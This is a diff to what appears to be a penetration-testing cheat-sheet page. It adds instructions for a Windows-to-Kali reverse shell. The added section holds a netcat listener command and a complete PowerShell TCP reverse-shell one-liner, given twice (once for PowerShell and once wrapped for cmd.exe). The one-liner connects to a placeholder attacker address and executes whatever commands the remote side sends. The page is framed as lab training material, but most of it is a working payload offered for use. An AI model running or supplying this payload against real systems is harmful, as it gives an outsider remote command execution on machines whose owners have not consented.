@@ -9,6 +9,46 @@ hideFooterPagination: true
 
 {/* Generated from Commands/windows-reverse-shell.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Windows → Kali reverse shell: choose the operation and read the result
+
+Start the listener on Kali, then run the connection on Windows. Use a Kali address reachable from Windows.
+
+### What the result establishes
+
+Match platform, architecture, callback address and listener protocol, then verify the received process identity.
+
+### Prerequisites and common failures
+
+A TCP connection is not automatically a working shell; command quoting, process lifetime and egress can each break the chain.
+
+### Example 1: 1. Kali — listener
+
+Run in: **Kali**.
+
+```bash
+sudo nc -lvnp 443
+```
+
+### Example 2: 2. Windows PowerShell — connect back
+
+Run in: **Windows PowerShell**. Replace &lt;ATTACKER_IP> with Kali’s reachable VPN address. Choose this OR the cmd.exe version below.
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+### Example 3: Alternative for Windows cmd.exe
+
+Run in: **Windows cmd.exe**. Replace &lt;ATTACKER_IP> with your reachable Kali/VPN address. This exact wrapper is for cmd.exe; do not paste it inside an existing PowerShell prompt.
+
+```text
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+## Saved commands and notebook recipes
+
+Start the listener on Kali, then run the connection on Windows. Use a Kali address reachable from Windows.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=windows-reverse-shell) · [All tools](/index)
@@ -20,6 +60,13 @@ Replace UPPER_CASE values with your lab values.
 ```bash
 sudo nc -lvnp 443
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — Netcat Listener (Attack Box)](/exploitation/shells-payloads-cheat-sheet#netcat-listener-attack-box)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 ## 2. Windows PowerShell — connect back
 
@@ -39,6 +86,21 @@ Replace &lt;ATTACKER_IP> with Kali’s reachable VPN address. Choose this OR the
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Shells, Payloads, and Interactive TTYs — PowerShell Reverse Shell One-Liner (Windows Target)](/exploitation/shells-payloads-cheat-sheet#powershell-reverse-shell-one-liner-windows-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 Replace &lt;ATTACKER_IP> with your reachable Kali/VPN address. This exact wrapper is for cmd.exe; do not paste it inside an existing PowerShell prompt.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
